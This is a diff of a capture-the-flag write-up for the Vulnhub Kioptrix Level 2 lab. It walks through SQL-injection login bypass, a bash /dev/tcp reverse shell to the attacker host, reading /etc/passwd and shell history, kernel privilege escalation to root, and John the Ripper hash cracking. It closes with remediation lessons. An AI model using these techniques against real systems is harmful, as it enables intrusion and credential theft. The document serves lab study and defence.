@@ -3,12 +3,14 @@
 **Platform:** Vulnhub
 **OS:** Kali linux
 **IP:** 192.168.56.102
+**Target OS:** CentOS (per Apache banner, kernel 2.6.9)
+**Target IP:** 192.168.56.103
 
 ---
 
 ## 1. Summary
 
-This box was pretty straightforward and simple. Nmap scans revealed the host with mysql and http servers open, which, after accessing the web page being hosted, led me to SQL injection. After that, on the subsequent page, remote code execution was the vulnerability too be exploited. Then privilege excalation was made with a kernel exploit, allowing me to get a root level shell.
+This box was pretty straightforward and simple. Nmap scans revealed the host with mysql and http servers open, which, after accessing the web page being hosted, led me to SQL injection. After that, on the subsequent page, remote code execution was the vulnerability too be exploited. Then privilege escalation was made with a kernel exploit, allowing me to get a root level shell.
 
 ---
 
@@ -45,12 +47,12 @@ PORT   STATE SERVICE
 
 Nmap done: 256 IP addresses (4 hosts up) scanned in 18.94 seconds
 ```
-With mysql and http servers open, this host was most likely my tartget machine
+With mysql and http servers open, this host was most likely my target machine
 
 ```
 nmap -sS -sV -p- -T3 192.168.56.103 
 ```
-So i could get deeper information on the taget IP's ports and services
+So i could get deeper information on the target IP's ports and services
 
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 16:00 -0300
@@ -89,7 +91,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.25 seconds
 
 - **Login field:** On the web page running on the server there was a remote administration system    
 - **Vulnerability:** The login field was vulnerable to SQL injection, taking a simple payload to bypass the password authentication
-- **Why it works:** By commenting everything at the end of the payload, i "deactivated" the rest of the code. The SQL code probably looked something like SELECT username FROM users where username=correctusername AND password=correctpas>
+- **Why it works:** By commenting everything at the end of the payload, i "deactivated" the rest of the code. The SQL code probably looked something like SELECT username FROM users where username=correctusername AND password=correctpassword. After the payload it became "SELECT username FROM users WHERE username=correctusername OR 1=1". Since 1 is always equal 1 SQL completely skipped the credential verification
 
 ### Payload 
 ```    
@@ -157,9 +159,9 @@ on the ping function field
 ### Explaining the payload
 
 - **bash -i:** Creates an interactive shell, making it behave like a regular session
-- **/dev/tcp/192.168.56.102/4444:** Bash can threat paths as network connections. Opening this path makes bash open a socket to the specified IP and port
-- **>&:** This redirects both the standart output and error output to the specified destination. Together with the command above, it makes shell outputs or error messages show up on the listening machine
-- **0>&1:** 0 represents the standar input. >&1 redirects file descriptor 0 (stdin) to file descriptor 1 (stdout). Together, there two operators ensure that standard input is also taken directly from the network socket.
+- **/dev/tcp/192.168.56.102/4444:** Bash can treat paths as network connections. Opening this path makes bash open a socket to the specified IP and port
+- **>&:** This redirects both the standard output and error output to the specified destination. Together with the command above, it makes shell outputs or error messages show up on the listening machine
+- **0>&1:** 0 represents the standard input. >&1 redirects file descriptor 0 (stdin) to file descriptor 1 (stdout). Together, these two operators ensure that standard input is also taken directly from the network socket.
 
 ```
 connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 32771
@@ -178,7 +180,7 @@ uid=48(apache) gid=48(apache) groups=48(apache)
 bash-3.00$ uname -a
 Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
 ```
-Basic information about the target system. Linux kernel version was especially usefull on privilege escalation
+Basic information about the target system. Linux kernel version was especially useful on privilege escalation
 
 ```
 bash-3.00$ cat /etc/passwd
@@ -257,13 +259,14 @@ bash-3.00$ ./exploit2
 Making the file executable, with the name "exploit2", and executing it
 
 ```
-sh: no job control in this shell
+sh-3.00# whoami
+root
 ```
 Got root level shell
 
 ### Root local recon
 
-After getting root i tried to extrafile any relevant information but couldn't do much with what was available, so i decided to go after information on john and harold, the users i found before.
+After getting root i tried to exfiltrate any relevant information but couldn't do much with what was available, so i decided to go after information on john and harold, the users i found before.
 
 ```
 sh-3.00# cat .mysql_history
@@ -318,12 +321,24 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:04:05 DONE (2026-07-01 17:10) 0g/s 57412p/s 114825c/s 114825C/s  ejngyhga007..*7¡Vamos!
 Session completed.
 ```
-I redirected the hashes to a file called "hashes.txt" and tried to break them using john the ripper, but to no avail
+I redirected the hashes to a file called "hashes.txt" and tried to break them using john the ripper, but to no avail.
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long  hashes.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:34:13 DONE (2026-07-18 03:40) 0g/s 6985p/s 13971c/s 13971C/s        1..*7¡Vamos!
+Session completed.
+```
+Since it recognized md5crypt-long, i ran john the ripper another time with "--format=md5crypt-long". Nothing again, so i gave up on it
 
 ---
 
 ## 7. Lessons Learned
 
-- User input should never be trusted and always sanitized server side
-- Functionalities that interact with the system need special attention, having code validated by the application
+- User input should never be trusted and always sanitized server side. Prepared statements or parameterized queries should be implemented
+- Never Shell-out user input. If necessary, use a strict allow-list or regex on IP format. Even better would be to use a language-level ping library instead of system() or exec()
 - The machine is old, but it's never enough to say that updating the system to the most recent version is essential
+- Don't store plaintext creds in shell history, rotate credentials, disable history logging for privileged accounts
